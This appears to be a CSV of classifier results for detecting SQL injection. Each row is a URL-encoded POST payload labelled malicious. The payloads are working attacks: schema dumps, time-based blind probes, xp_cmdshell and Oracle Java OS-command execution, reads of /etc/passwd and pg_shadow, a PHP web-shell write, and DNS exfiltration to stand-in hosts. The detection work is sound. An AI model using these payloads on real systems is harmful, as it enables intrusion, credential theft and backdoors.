Method,length,content,URL,Predicted_Probability,Predicted_Label
POST,2384,p=%2Bconcat%280x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20%2Cversion%28%29%2C0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20%2C%28select%20count%28%2A%29%20from%20information_schema.schemata%29%2C0x3c2f666f6e743e3c2f666f6e743e%2C0x202d2d203a2d20%2Cconcat%28%40sc%3A%3D0x00%2C%40scc%3A%3D0x00%2C%40r%3A%3D0%2Cbenchmark%28%40a%3A%3D%28select%20count%28%2A%29%20from%20information_schema.schemata%29%2C%40scc%3A%3Dconcat%28%40scc%2C0x3c62723e3c62723e%2C0x3c666f6e7420636f6c6f723d7265643e%2CLPAD%28%40r%3A%3D%40r%2b1%2C3%2C0x30%29%2C0x2e20%2C%28Select%20concat%280x3c623e%2C%40sc%3A%3Dschema_name%2C0x3c2f623e%29%20from%20information_schema.schemata%20where%20schema_name%3E%40sc%20order%20by%20schema_name%20limit%201%29%2C0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20%2C%28select%20count%28%2A%29%20from%20information_Schema.tables%20where%20table_schema%3D%40sc%29%2C0x29%2C0x3c2f666f6e743e%2C0x202e2e2e20%20%2C%40t%3A%3D0x00%2C%40tt%3A%3D0x00%2C%40tr%3A%3D0%2Cbenchmark%28%28select%20count%28%2A%29%20from%20information_Schema.tables%20where%20table_schema%3D%40sc%29%2C%40tt%3A%3Dconcat%28%40tt%2C0x3c62723e%2C0x3c666f6e7420636f6c6f723d677265656e3e%2CLPAD%28%40tr%3A%3D%40tr%2b1%2C3%2C0x30%29%2C0x2e20%2C%28select%20concat%280x3c623e%2C%40t%3A%3Dtable_name%2C0x3c2f623e%29%20from%20information_Schema.tables%20where%20table_schema%3D%40sc%20and%20table_name%3E%40t%20order%20by%20table_name%20limit%201%29%2C0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20%2C%28select%20count%28%2A%29%20from%20information_Schema.columns%20where%20table_name%3D%40t%29%2C0x29%2C0x3c2f666f6e743e%2C0x202d2d3a20%2C%40c%3A%3D0x00%2C%40cc%3A%3D0x00%2C%40cr%3A%3D0%2Cbenchmark%28%28Select%20count%28%2A%29%20from%20information_schema.columns%20where%20table_schema%3D%40sc%20and%20table_name%3D%40t%29%2C%40cc%3A%3Dconcat%28%40cc%2C0x3c62723e%2C0x3c666f6e7420636f6c6f723d707572706c653e%2CLPAD%28%40cr%3A%3D%40cr%2b1%2C3%2C0x30%29%2C0x2e20%2C%28Select%20%28%40c%3A%3Dcolumn_name%29%20from%20information_schema.columns%20where%20table_schema%3D%40sc%20and%20table_name%3D%40t%20and%20column_name%3E%40c%20order%20by%20column_name%20LIMIT%201%29%2C0x3c2f666f6e743e%29%29%2C%40cc%2C0x3c62723e%29%29%2C%40tt%29%29%2C%40scc%29%2C0x3c62723e3c62723e%2C0x3c62723e3c62723e%29%2B,/,1.0,1
POST,1837,p=%2Bconcat/%2A%21%28unhex%28hex%28concat/%2A%21%280x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e%2C0x223e%2C0x273e%2C0x3c62723e3c62723e%2Cunhex%28hex%28concat/%2A%21%280x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e%29%29%29%2C0x3c62723e3c62723e%2C0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20%2Cversion%28%29%2C0x7e20%2C%40%40version_comment%2C0x3c62723e5072696d617279204461746162617365203a3a20%2C%40d%3A%3Ddatabase%28%29%2C0x3c62723e44617461626173652055736572203a3a20%2Cuser%28%29%2C%28/%2A%2112345selEcT%2A/%28%40x%29/%2A%21from%2A/%28/%2A%2112345selEcT%2A/%28%40x%3A%3D0x00%29%2C%28%40r%3A%3D0%29%2C%28%40running_number%3A%3D0%29%2C%28%40tbl%3A%3D0x00%29%2C%28/%2A%2112345selEcT%2A/%280%29%20from%28information_schema./%2A%2A/columns%29where%28table_schema%3Ddatabase%28%29%29%20and%280x00%29in%28%40x%3A%3DConcat/%2A%21%28%40x%2C%200x3c62723e%2C%20if%28%20%28%40tbl%21%3Dtable_name%29%2C%20Concat/%2A%21%280x3c666f6e7420636f6c6f723d707572706c652073697a653d333e%2C0x3c62723e%2C0x3c666f6e7420636f6c6f723d626c61636b3e%2CLPAD%28%40r%3A%3D%40r%2b1%2C%202%2C%200x30%29%2C0x2e203c2f666f6e743e%2C%40tbl%3A%3Dtable_name%2C0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28%2Cdatabase%28%29%2C0x293c2f666f6e743e3c2f666f6e743e%2C0x3c2f666f6e743e%2C0x3c62723e%29%2C%200x00%29%2C0x3c666f6e7420636f6c6f723d626c61636b3e%2CLPAD%28%40running_number%3A%3D%40running_number%2b1%2C3%2C0x30%29%2C0x2e20%2C0x3c2f666f6e743e%2C0x3c666f6e7420636f6c6f723d7265643e%2Ccolumn_name%2C0x3c2f666f6e743e%29%29%29%29x%29%29%29%29%29%2A/%2B,/,1.0,1
POST,152,p=create%20table%20myfile%20%28input%20TEXT%29%3B%20load%20data%20infile%20%27/etc/hosts%27%20into%20table%20myfile%3B%20select%20%2A%20from%20myfile%3B,/,1.0,1
POST,173,p=create%20table%20myfile%20%28line%20varchar%288000%29%29%22%20bulk%20insert%20foo%20from%20%27c%3A%5Cinetpub%5Cwwwroot%5Cauth.asp%27%22%20select%20%2A%20from%20myfile%22--,/,1.0,1
POST,125,p=declare%20%40q%20nvarchar%20%28200%29%200x730065006c00650063007400200040004000760065007200730069006f006e00%20exec%28%40q%29,/,1.0,1
POST,114,p=declare%20%40s%20varchar%20%28200%29%20select%20%40s%20%3D%200x73656c65637420404076657273696f6e%20exec%28%40s%29,/,1.0,1
POST,64,p=exec%20master..xp_cmdshell%20%27ipconfig%2B/all%27%20%20%20%20,/,1.0,1
POST,48,p=exec%20master..xp_cmdshell%20%27net%2Busers%27,/,0.9999999,1
POST,47,p=exec%20master..xp_cmdshell%20%27net%2Bview%27,/,1.0,1
POST,64,p=%27%3B%20exec%20master..xp_cmdshell%20%27ping%20127.0.0.1%27--,/,1.0,1
POST,53,p=exec%20master..xp_cmdshell%20%27ping%2B127.0.0.1%27,/,1.0,1
POST,77,p=%27%20grant%20connect%20to%20name%3B%20grant%20resource%20to%20name%3B%20--,/,1.0,1
POST,54,p=%27%20GROUP%20BY%20columnnames%20having%201%3D1%20--,/,1.0,1
POST,221,p=%27%20GROUP%20BY%20column_name%20UNION%20ALL%20SELECT%20column_name%2C1%2C1%20FROM%20%20%28select%20column_name%20AS%20new_name%20from%20%60project_id.dataset_name.table_name%60%29%20AS%20A%20GROUP%20BY%20column_name%23,/,1.0,1
POST,19,p=%20HAVING%201%3D0,/,1.0,1
POST,22,p=%20HAVING%201%3D0%23,/,1.0,1
POST,24,p=%20HAVING%201%3D0--%20,/,1.0,1
POST,19,p=%20HAVING%201%3D1,/,1.0,1
POST,22,p=%20HAVING%201%3D1%23,/,1.0,1
POST,24,p=%20HAVING%201%3D1--%20,/,1.0,1
POST,74,p=%20IF%287423%3D7423%29%20SELECT%207423%20ELSE%20DROP%20FUNCTION%20xcjl--,/,1.0,1
POST,82,p=injection%27%3Bcreate%20table%20NotSoSecure%20%28data%20varchar%28200%29%29%3B--,/,1.0,1
POST,177,p=%2Bmake_set%286%2C%40%3A%3D0x0a%2C%28select%281%29from%28information_schema.columns%29where%40%3A%3Dmake_set%28511%2C%40%2C0x3c6c693e%2Ctable_name%2Ccolumn_name%29%29%2C%40%29,/,1.0,1
POST,174,p=make_set%286%2C%40%3A%3D0x0a%2C%28select%281%29from%28information_schema.columns%29where%40%3A%3Dmake_set%28511%2C%40%2C0x3c6c693e%2Ctable_name%2Ccolumn_name%29%29%2C%40%29,/,1.0,1
POST,86,p=%27%20%7C%7C%20myappadmin.adduser%28%27admin%27%2C%20%27newpass%27%29%20%7C%7C%20%27,/,1.0,1
POST,15,p=%20OR%201%3D0,/,1.0,1
POST,18,p=%20OR%201%3D0%23,/,1.0,1
POST,20,p=%20OR%201%3D0--%20,/,1.0,1
POST,18,p=%20OR%201%3D1%23,/,1.0,1
POST,20,p=%20OR%201%3D1--%20,/,1.0,1
POST,25,p=%27or%20123.22%3D123.22,/,1.0,1
POST,88,p=OR%202947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%281000000000/2%29%29%29%29,/,1.0,1
POST,60,p=%20OR%203409%3D3409%20AND%20%28%27pytW%27%20LIKE%20%27pytW,/,1.0,1
POST,52,p=%22%20or%20benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,55,p=%22%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,58,p=%22%29%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,52,p=%27%20or%20benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,55,p=%27%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,58,p=%27%29%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,43,p=or%20benchmark%2850000000%2CMD5%281%29%29,/,1.0,1
POST,46,p=or%20benchmark%2850000000%2CMD5%281%29%29%23,/,1.0,1
POST,45,p=or%20benchmark%2850000000%2CMD5%281%29%29--,/,1.0,1
POST,22,p=%20ORDER%20BY%201%20,/,1.0,1
POST,25,p=%20ORDER%20BY%201%23%20,/,1.0,1
POST,24,p=%20ORDER%20BY%201--%20,/,1.0,1
POST,135,p=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%23,/,1.0,1
POST,157,p=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20,/,1.0,1
POST,164,p=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21--,/,1.0,1
POST,27,p=ORDER%20BY%20SLEEP%285%29,/,1.0,1
POST,30,p=ORDER%20BY%20SLEEP%285%29%23,/,1.0,1
POST,29,p=ORDER%20BY%20SLEEP%285%29--,/,1.0,1
POST,25,p=%27%20or%20%28EXISTS%29,/,1.0,1
POST,98,p=%27%20OR%20if%281/%28length%28%28select%28%27a%27%29%29%29-1%29%3D1%2Ctrue%2Cfalse%29%20OR%20%27,/,1.0,1
POST,32,p=%20or%20isNULL%281/0%29%20/%2A,/,1.0,1
POST,35,p=%22%20or%20isNULL%281/0%29%20/%2A,/,1.0,1
POST,30,p=%22%20or%20pg_sleep%285%29--,/,1.0,1
POST,33,p=%22%29%20or%20pg_sleep%285%29--,/,1.0,1
POST,36,p=%22%29%29%20or%20pg_sleep%285%29--,/,1.0,1
POST,30,p=%27%20or%20pg_sleep%285%29--,/,1.0,1
POST,33,p=%27%29%20or%20pg_sleep%285%29--,/,1.0,1
POST,36,p=%27%29%29%20or%20pg_sleep%285%29--,/,1.0,1
POST,22,p=or%20pg_SLEEP%285%29,/,1.0,1
POST,25,p=or%20pg_SLEEP%285%29%23,/,1.0,1
POST,24,p=or%20pg_SLEEP%285%29--,/,1.0,1
POST,180,p=%27%20OR%20%28SELECT%20%28CASE%20WHEN%20EXISTS%28SELECT%20name%20FROM%20items%20WHERE%20name%20REGEXP%20%22%5Ea.%2A%22%29%20THEN%20SLEEP%283%29%20ELSE%201%20END%29%29%3B%20--%20-,/,1.0,1
POST,28,p=%22%20or%20sleep%285%29%23,/,1.0,1
POST,31,p=%22%20or%20sleep%285%29%3D%22,/,1.0,1
POST,34,p=%22%29%20or%20sleep%285%29%3D%22,/,1.0,1
POST,37,p=%22%29%29%20or%20sleep%285%29%3D%22,/,1.0,1
POST,28,p=%27%20or%20sleep%285%29%23,/,1.0,1
POST,31,p=%27%20or%20sleep%285%29%3D%27,/,1.0,1
POST,34,p=%27%29%20or%20sleep%285%29%3D%27,/,1.0,1
POST,37,p=%27%29%29%20or%20sleep%285%29%3D%27,/,1.0,1
POST,19,p=or%20SLEEP%285%29,/,1.0,1
POST,22,p=or%20SLEEP%285%29%23,/,1.0,1
POST,21,p=or%20SLEEP%285%29--,/,1.0,1
POST,25,p=or%20SLEEP%285%29%3D%22,/,1.0,1
POST,25,p=or%20SLEEP%285%29%3D%27,/,1.0,1
POST,19,p=%22%20or%20true--,/,1.0,1
POST,22,p=%22%29%20or%20true--,/,1.0,1
POST,19,p=%27%20or%20true--,/,1.0,1
POST,22,p=%27%29%20or%20true--,/,1.0,1
POST,13,p=or%20true--,/,1.0,1
POST,30,p=%27%20or%20uid%20like%20%27%,/,1.0,1
POST,32,p=%27%20or%20uname%20like%20%27%,/,1.0,1
POST,45,p=%20or%20%27unusual%27%20%3D%20%27unusual%27,/,1.0,1
POST,48,p=%27%20or%20%27unusual%27%20%3D%20%27unusual%27,/,1.0,1
POST,15,p=%20OR%20x%3Dx,/,1.0,1
POST,18,p=%20OR%20x%3Dx%23,/,1.0,1
POST,20,p=%20OR%20x%3Dx--%20,/,1.0,1
POST,15,p=%20OR%20x%3Dy,/,1.0,1
POST,18,p=%20OR%20x%3Dy%23,/,1.0,1
POST,20,p=%20OR%20x%3Dy--%20,/,1.0,1
POST,19,p=pg_sleep%285%29--,/,0.9999999,1
POST,17,p=pg_SLEEP%285%29,/,0.99999976,1
POST,20,p=pg_SLEEP%285%29%23,/,1.0,1
POST,19,p=pg_SLEEP%285%29--,/,1.0,1
POST,30,p=RANDOMBLOB%281000000000/2%29,/,1.0,1
POST,132,p=%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4346%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29%20AND%20%27Txws%27%3D%27,/,1.0,1
POST,238,p=%27%2B%28select%201%20and%20row%281%2C1%29%3E%28select%20count%28%2A%29%2Cconcat%28CONCAT%28%40%40VERSION%29%2C0x3a%2Cfloor%28rand%28%29%2A2%29%29x%20from%20%28select%201%20union%20select%202%29a%20group%20by%20x%20limit%201%29%29%2B%27,/,1.0,1
POST,226,p=%28select%201%20and%20row%281%2C1%29%3E%28select%20count%28%2A%29%2Cconcat%28CONCAT%28%40%40VERSION%29%2C0x3a%2Cfloor%28rand%28%29%2A2%29%29x%20from%20%28select%201%20union%20select%202%29a%20group%20by%20x%20limit%201%29%29,/,1.0,1
POST,289,p=%28select%28%40a%29from%28select%28%40a%3A%3D0x00%29%2C%28select%28%40a%29from%28information_schema.columns%29where%28table_schema%21%3D0x696e666f726d6174696f6e5f736368656d61%29and%28%40a%29in%28%40a%3A%3Dconcat%28%40a%2Ctable_name%2C0x203a3a20%2Ccolumn_name%2C0x3c62723e%29%29%29%29a%29,/,1.0,1
POST,153,p=select%20case%20when%20substring%28column%2C1%2C1%29%3D%271%27%20then%20pg_sleep%285%29%20else%20pg_sleep%280%29%20end%20from%20column_name%20limit%201,/,1.0,1
POST,189,p=select%20case%20when%20substring%28column%2C1%2C1%29%3D%271%27%20then%20pg_sleep%285%29%20else%20pg_sleep%280%29%20end%20from%20column_name%20where%20column_name%3D%27value%27%20limit%201,/,1.0,1
POST,154,p=select%20case%20when%20substring%28datname%2C1%2C1%29%3D%271%27%20then%20pg_sleep%285%29%20else%20pg_sleep%280%29%20end%20from%20pg_database%20limit%201,/,1.0,1
POST,171,p=select%20case%20when%20substring%28table_name%2C1%2C1%29%3D%27a%27%20then%20pg_sleep%285%29%20else%20pg_sleep%280%29%20end%20from%20information_schema.tables%20limit%201,/,1.0,1
POST,36,p=select%20current_database%28%29%3B,/,0.9999999,1
POST,56,p=select%20current%20server%20from%20sysibm.sysdummy1%3B,/,0.9999988,1
POST,52,p=select%20current_setting%28%27config_file%27%29%3B,/,1.0,1
POST,55,p=select%20current_setting%28%27data_directory%27%29%3B,/,1.0,1
POST,49,p=select%20current_setting%28%27hba_file%27%29%3B,/,1.0,1
POST,59,p=select%20current_setting%28%27krb_server_keyfile%27%29%3B,/,0.9999999,1
POST,56,p=select%20current_setting%28%27log_connections%27%29%3B,/,0.9999999,1
POST,54,p=select%20current_setting%28%27log_statement%27%29%3B,/,1.0,1
POST,60,p=select%20current_setting%28%27password_encryption%27%29%3B,/,0.9999999,1
POST,45,p=select%20current_setting%28%27port%27%29%3B,/,1.0,1
POST,53,p=select%20current_setting%28%27virtual_host%27%29%3B,/,1.0,1
POST,26,p=select%20current_user%3B,/,0.999998,1
POST,122,p=SELECT%20DBMS_JAVA.RUNJAVA%28%27oracle/aurora/util/Wrapper%20/bin/bash%20-c%20/bin/ls%3E/tmp/OUT.LST%27%29%20FROM%20DUAL,/,1.0,1
POST,159,p=SELECT%20DBMS_JAVA_TEST.FUNCALL%28%27oracle/aurora/util/Wrapper%27%2C%27main%27%2C%27/bin/bash%27%2C%27-c%27%2C%27/bin/ls%3E/tmp/OUT2.LST%27%29%20from%20dual,/,1.0,1
POST,198,p=SELECT%20DBMS_JAVA_TEST.FUNCALL%28%27oracle/aurora/util/Wrapper%27%2C%27main%27%2C%27c%3A%5C%5Cwindows%5C%5Csystem32%5C%5Ccmd.exe%27%2C%27/c%27%2C%20%27dir%20%3Ec%3A%5Ctest.txt%27%29%20FROM%20DUAL,/,1.0,1
POST,238,p=%28Select%20export_set%285%2C%40%3A%3D0%2C%28select%20count%28%2A%29from%28information_schema.columns%29where%40%3A%3Dexport_set%285%2Cexport_set%285%2C%40%2Ctable_name%2C0x3c6c693e%2C2%29%2Ccolumn_name%2C0xa3a%2C2%29%29%2C%40%2C2%29%29,/,1.0,1
POST,43,p=select%20%2A%20from%20master..sysserverse,/,1.0,1
POST,66,p=select%20%2A%20from%20myfile%3Bcopy%20myfile%20to%20/tmp/test%3B,/,1.0,1
POST,35,p=select%20%2A%20from%20pg_group%3B,/,1.0,1
POST,36,p=select%20%2A%20from%20pg_shadow%3B,/,1.0,1
POST,305,p=%28select%20%28%40%29%20from%20%28select%28%40%3A%3D0x00%29%2C%28select%20%28%40%29%20from%20%28db_data.table_data%29%20where%20%28%40%29in%20%28%40%3A%3Dconcat%28%40%2C0x0D%2C0x0A%2C0x7C%2C%27%20%5B%20%27%2Ccolumn_data1%2C%27%20%5D%20%3E%20%27%2Ccolumn_data2%2C%27%20%3E%20%27%2C0x7C%29%29%29%29a%29%23,/,1.0,1
POST,212,p=%28select%28%40%29from%28select%28%40%3A%3D0x00%29%2C%28select%28%40%29from%28information_schema.columns%29where%28%40%29in%28%40%3A%3Dconcat%28%40%2C0x3C62723E%2Ctable_name%2C0x3a%2Ccolumn_name%29%29%29%29a%29,/,1.0,1
POST,354,p=%28select%20%28%40%29%20from%20%28select%28%40%3A%3D0x00%29%2C%28select%20%28%40%29%20from%20%28information_schema.columns%29%20where%20%28table_schema%3E%3D%40%29%20and%20%28%40%29in%20%28%40%3A%3Dconcat%28%40%2C0x0D%2C0x0A%2C%27%20%5B%20%27%2Ctable_schema%2C%27%20%5D%20%3E%20%27%2Ctable_name%2C%27%20%3E%20%27%2Ccolumn_name%2C0x7C%29%29%29%29a%29%23,/,1.0,1
POST,65,p=%2C%28select%20%2A%20from%20%28select%28sleep%2810%29%29%29a%29,/,1.0,1
POST,64,p=%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ecMj%29,/,1.0,1
POST,67,p=%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ecMj%29%23,/,1.0,1
POST,66,p=%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ecMj%29--,/,1.0,1
POST,81,p=select%20%2A%20from%20syscat.dbauth%20where%20grantee%20%3D%20current%20user%3B,/,1.0,1
POST,41,p=select%20%2A%20from%20syscat.tabauth%3B,/,1.0,1
POST,82,p=select%20%2A%20from%20syscat.tabauth%20where%20grantee%20%3D%20current%20user%3B,/,1.0,1
POST,32,p=select%20%2A%20from%20sysusers,/,1.0,1
POST,44,p=select%20grantee%20from%20syscat.dbauth%3B,/,1.0,1
POST,95,p=SELECT%20if%28LPAD%28%27%20%27%2C4%2Cversion%28%29%29%3D%275.7%27%2Csleep%285%29%2Cnull%29%3B,/,1.0,1
POST,107,p=select%20load_file%28concat%280x5c5c5c5c%2Cversion%28%29%2C0x2e6861636b65722e736974655c5c612e747874%29%29,/,1.0,1
POST,107,p=select%20load_file%28concat%28%27%5C%5C%5C%5C%27%2Cversion%28%29%2C%27.fake.domain%5C%5Ca.txt%27%29%29%3B,/,1.0,1
POST,33,p=select%20%40%40microsoftversion,/,0.9999999,1
POST,44,p=select%20name%20from%20sysibm.systables%3B,/,0.9999987,1
POST,70,p=select%20name%2C%20tbname%2C%20coltype%20from%20sysibm.syscolumns%3B,/,0.9999999,1
POST,694,p=SELECT%20replace%28replace%28replace%28replace%28replace%28replace%28replace%28replace%28replace%28replace%28substr%28%28substr%28sql%2Cinstr%28sql%2C%27%28%27%29%2b1%29%29%2Cinstr%28%28substr%28sql%2Cinstr%28sql%2C%27%28%27%29%2b1%29%29%2C%27%27%29%29%2C%22TEXT%22%2C%27%27%29%2C%22INTEGER%22%2C%27%27%29%2C%22AUTOINCREMENT%22%2C%27%27%29%2C%22PRIMARY%20KEY%22%2C%27%27%29%2C%22UNIQUE%22%2C%27%27%29%2C%22NUMERIC%22%2C%27%27%29%2C%22REAL%22%2C%27%27%29%2C%22BLOB%22%2C%27%27%29%2C%22NOT%20NULL%22%2C%27%27%29%2C%22%2C%22%2C%27~~%27%29%20FROM%20sqlite_master%20WHERE%20type%21%3D%27meta%27%20AND%20sql%20NOT%20NULL%20AND%20name%20NOT%20LIKE%20%27sqlite_%%27%20AND%20name%20%3D%27table_name%27,/,1.0,1
POST,49,p=SELECT%20schemaname%20FROM%20syscat.schemata%3B,/,1.0,1
POST,207,p=%28select%28select%20concat%28%40%3A%3D0xa7%2C%28select%20count%28%2A%29from%28information_schema.columns%29where%28%40%3A%3Dconcat%28%40%2C0x3c6c693e%2Ctable_name%2C0x3a%2Ccolumn_name%29%29%29%2C%40%29%29,/,1.0,1
POST,27,p=select%20%40%40servername,/,0.9999975,1
POST,26,p=select%20session_user%3B,/,0.9999989,1
POST,52,p=select%20session_user%20from%20sysibm.sysdummy1%3B,/,0.99999917,1
POST,51,p=select%20system_user%20from%20sysibm.sysdummy1%3B,/,0.9999993,1
POST,44,p=select%20user%20from%20sysibm.sysdummy1%3B,/,0.9999995,1
POST,24,p=select%20%40%40version,/,0.9999999,1
POST,27,p=select%20version%28%29%3B,/,1.0,1
POST,78,p=select%20versionnumber%2C%20version_timestamp%20from%20sysibm.sysversions%3B,/,0.99999964,1
POST,89,p=select%20xml2clob%28xmelement%28name%20t%2C%20table_schema%29%29%20from%20sysibm.tables,/,0.9999999,1
POST,121,p=select%20xmlagg%28xmlrow%28table_schema%29%29%20from%20%28select%20distinct%28table_schema%29%20from%20sysibm.tables%29,/,0.99999964,1
POST,70,p=select%20xmlagg%28xmlrow%28table_schema%29%29%20from%20sysibm.tables,/,0.9999988,1
POST,33,p=%2B%20SLEEP%2810%29%20%2B%20%27,/,1.0,1
POST,90,p=SLEEP%281%29/%2A%27%20or%20SLEEP%281%29%20or%20%27%22%20or%20SLEEP%281%29%20or%20%22%2A/,/,1.0,1
POST,20,p=%26%26SLEEP%285%29,/,1.0,1
POST,23,p=%26%26SLEEP%285%29%23,/,1.0,1
POST,22,p=%26%26SLEEP%285%29--,/,1.0,1
POST,17,p=SLEEP%285%29%23,/,1.0,1
POST,16,p=SLEEP%285%29--,/,1.0,1
POST,20,p=SLEEP%285%29%3D%22,/,1.0,1
POST,20,p=SLEEP%285%29%3D%27,/,1.0,1
POST,33,p=%27%26%26SLEEP%285%29%26%26%271,/,1.0,1
POST,168,p=true%29%20GROUP%20BY%20column_name%20LIMIT%201%20UNION%20ALL%20SELECT%20%28SELECT%20%27asd%27%29%2C1%2C1%2C1%2C1%2C1%2C1%29%29%20AS%20T1%20GROUP%20BY%20column_name%23,/,1.0,1
POST,175,p=true%29%20GROUP%20BY%20column_name%20LIMIT%201%20UNION%20ALL%20SELECT%20%28SELECT%20%40%40project_id%29%2C1%2C1%2C1%2C1%2C1%2C1%29%29%20AS%20T1%20GROUP%20BY%20column_name%23,/,1.0,1
POST,62,p=%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8--%20,/,1.0,1
POST,116,p=%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20,/,1.0,1
POST,124,p=%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%23,/,1.0,1
POST,176,p=union%20all%20select%201%2C2%2C3%2C4%2C%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%2C6%20into%20OUTFILE%20%27c%3A/inetpub/wwwroot/backdoor.php%27,/,1.0,1
POST,352,p=%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28110%29%2BCHAR%28106%29%2BCHAR%2899%29%2BCHAR%2873%29%2BCHAR%2866%29%2BCHAR%28109%29%2BCHAR%28119%29%2BCHAR%2881%29%2BCHAR%28108%29%2BCHAR%2888%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2CNULL--%20,/,1.0,1
POST,67,p=%20UNION%20ALL%20SELECT%20%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27,/,1.0,1
POST,71,p=%20UNION%20ALL%20SELECT%20%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2,/,1.0,1
POST,75,p=%20UNION%20ALL%20SELECT%20%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3,/,1.0,1
POST,68,p=%27%20UNION%20ALL%20SELECT%20LOAD_FILE%28%27/etc/passwd%27%29%20--,/,1.0,1
POST,35,p=%20UNION%20ALL%20SELECT%20NULL%20,/,1.0,1
POST,35,p=%20UNION%20ALL%20SELECT%20NULL%23,/,1.0,1
POST,37,p=%20UNION%20ALL%20SELECT%20NULL--%20,/,1.0,1
POST,126,p=UNION%20ALL%20SELECT%20%28SELECT%20%40%40project_id%29%2C1%2C1%2C1%2C1%2C1%2C1%29%29%20AS%20T1%20GROUP%20BY%20column_name%23,/,1.0,1
POST,45,p=%20UNION%20ALL%20SELECT%20SLEEP%285%29--%20,/,1.0,1
POST,87,p=UNION%20ALL%20SELECT%20TO_base64%28LOAD_FILE%28%27/var/www/html/index.php%27%29%29%3B,/,1.0,1
POST,43,p=%20UNION%20ALL%20SELECT%20USER%28%29--%20,/,1.0,1
POST,58,p=%20UNION%20ALL%20SELECT%20USER%28%29%2CSLEEP%285%29--%20,/,1.0,1
